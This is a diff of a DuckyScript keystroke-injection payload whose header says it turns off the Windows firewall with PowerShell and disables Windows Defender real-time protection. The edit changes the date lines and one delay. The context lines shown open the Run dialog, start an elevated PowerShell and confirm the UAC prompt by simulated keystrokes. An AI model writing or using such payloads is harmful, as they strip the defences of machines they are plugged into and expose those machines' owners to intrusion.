@@ -1,7 +1,8 @@
 REM Author: NocX
 REM Description: Turns off Firewall with powershell and disables real time protection using the Windows Defender GUI
 REM Version: 1.0
-REM Date: 17/01/2025
+REM Creation Date: 17/01/2025
+REM Update date: 18/01/2025
 REM Category: Security
 REM ------------------------------------
 REM This script:
@@ -20,7 +21,7 @@ GUI r
 DELAY 500
 STRING powershell Start-Process powershell -Verb runAs
 ENTER
-DELAY 800
+DELAY 2500
 LEFTARROW
 ENTER
 DELAY 500
